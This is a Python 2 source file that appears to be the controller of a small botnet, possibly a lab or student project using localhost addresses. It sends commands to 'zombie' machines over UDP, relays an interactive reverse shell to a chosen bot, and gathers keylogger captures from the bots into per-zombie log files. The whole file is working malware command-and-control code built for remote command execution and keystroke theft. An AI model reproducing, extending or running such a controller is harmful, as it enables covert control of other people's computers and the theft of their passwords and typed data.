import sys
import socket

MASTER_IP = "127.0.0.1"
MASTER_PORT = 6000

#Read bots from file?
bots = [("127.0.0.1",6001),("127.0.0.1",6002)]
NUM_BOTS = 2


class Master:

	def __init__(self, bots, socket):
		#list of (ip,port) pairs
		self.bots = bots
		#list of connections
		self.sock = socket

		#Number of key logs written
		self.log_num = 0


	#Reverse Shell
	def reverse_shell(self,dest):

		print "Starting reverse shell...\n"
		print "Start entering commands. Enter 'exit' to stop.\n"

		while True:
			cmd = raw_input()				#Receive shell command
			if cmd == 'exit':					#Break if user wished to exit
				print "Exiting...\n"
				self.sock.sendto(cmd,dest)
				break

			#send command to zombie
			self.sock.sendto(cmd,dest)

			#print results
			data, addr = self.sock.recvfrom(1024)
			print data

	def keylog(self,isall,bot):
		#all bots
		if isall == True:
			#File to write log to
			f = []
			for i in xrange(len(bots)):
				fi = open("ZOMB"+str(i)+"_keylog"+str(self.log_num)+".txt",'w')
				f.append(fi)

			print "Waiting for keylog data..."
			for i in xrange(len(bots)):
				data, addr = self.sock.recvfrom(1024)
				print "Received: " + data + "\nfrom " + addr[0] + " " + str(addr[1])
				data = data.split('`')
				f[int(data[2])-6001].write(data[0])			#hard coded index
			
			for i in xrange(len(bots)):
				f[i].close()

		#Just one bot
		else:
			f = open("ZOMB"+str(bot)+"_keylog"+str(self.log_num)+".txt",'w')

			print "Waiting for keylog data..."

			data, addr = self.sock.recvfrom(1024)
			print "Received: " + data + "\nfrom " + addr[0] + " " + str(addr[1])
			data = data.split('`')
			f.write(data[0])			#hard coded index

		self.log_num += 1



if __name__ == '__main__':
 
	try:
		# s.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))		#Create socket
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)	#Create socket
		s.bind((MASTER_IP,MASTER_PORT))								#Bind to port
		print 'Socket created'
	except socket.error, msg :
		print 'Failed: ' + str(i) + '. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
		sys.exit()
			
	mast = Master(bots,s)
	
	while True:

		print "Enter command..."

		#format = "BOT CMD"
		cmd = raw_input()
		cmd = cmd.split(' ')

		dest = cmd[0]
		msg = cmd[1]
		parse_temp = msg.split(',')

		#Send to all bots
		if dest == "all":
			if msg == "RVSH":
				print "cannot reverse shell all bots..."
				continue

			print "sending command to all bots..."
			for i in xrange(NUM_BOTS):
				mast.sock.sendto(msg,mast.bots[i])

			#If keylog command
			if parse_temp[0] == "KEYL":
				mast.keylog(True,0)
		else:
			dest = int(cmd[0])
			print "sending " + msg + " to " + str(dest)
			mast.sock.sendto(msg,mast.bots[dest])

			#If keylog command
			if parse_temp[0] == "KEYL":
				mast.keylog(False,dest)


		#Check if command was reverse shell or keylog
		if cmd[1] == "RVSH":
			data, addr = mast.sock.recvfrom(1024)
			if data == "RVSH":
				mast.reverse_shell(mast.bots[dest])

		


	mast.sock.close()
